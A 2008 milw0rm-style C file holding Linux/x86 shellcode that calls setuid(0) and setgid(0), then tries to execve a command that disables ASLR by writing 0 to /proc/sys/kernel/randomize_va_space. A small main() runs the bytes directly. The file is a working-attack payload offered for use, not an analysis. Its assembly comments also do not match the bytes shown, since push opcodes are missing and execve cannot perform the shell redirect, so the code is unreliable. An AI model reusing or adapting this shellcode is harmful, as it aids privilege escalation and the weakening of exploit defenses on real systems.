/*
 * Linux/x86 (Fedora 8) setuid(0) + setgid(0) + execve("echo 0 > /proc/sys/kernel/randomize_va_space")
 *
 * by LiquidWorm
 *
 * 2008 (c) www.zeroscience.org
 *
 * liquidworm [at] gmail.com
 *
 * 79 bytes.
 *
 */


char sc[] =

  "\x6a\x17"			// push	$0x17
  "\x58"			// pop 	%eax
  "\x31\xdb"			// xor	%ebx, %ebx
  "\xcd\x80"			// int	$0x80
  "\x6a\x2e"			// push	$0x2e
  "\x58"			// pop	%eax
  "\x53"			// push %ebx
  "\xcd\x80"			// int	$0x80
  "\x31\xd2"			// xor	%edx, %edx
  "\x6a\x0b"			// push	$0xb
  "\x58"			// pop	%eax
  "\x52"			// push	%edx
  "\x70\x61\x63\x65"            // push $0x65636170
  "\x76\x61\x5f\x73"            // push $0x735f6176
  "\x69\x7a\x65\x5f"            // push $0x5f657a69
  "\x6e\x64\x6f\x6d"            // push $0x6d6f646e
  "\x6c\x2f\x72\x61"            // push $0x61722f6c
  "\x65\x72\x6e\x65"            // push $0x656e7265
  "\x73\x2f\x2f\x6b"            // push $0x6b2f2f73
  "\x2f\x2f\x73\x79"            // push $0x79732f2f
  "\x70\x72\x6f\x63"            // push $0x636f7270
  "\x20\x3e\x20\x2f"            // push $0x2f203e20
  "\x68\x6f\x20\x30"            // push $0x30206f68
  "\x2f\x2f\x65\x63"            // push $0x63652f2f
  "\x2f\x62\x69\x6e"            // push $0x6e69622f
  "\x89\xe3"			// mov	%esp, %ebx
  "\x52"			// push	%edx
  "\x53"			// push	%ebx
  "\x89\xe1"			// mov	%esp, %ecx
  "\xcd\x80";			// int	$0x80

int main()
{
	int (*fp)() = (int(*)())sc;
    	printf("bytes: %u\n", strlen(sc));
    	fp();
}

// milw0rm.com [2008-08-18]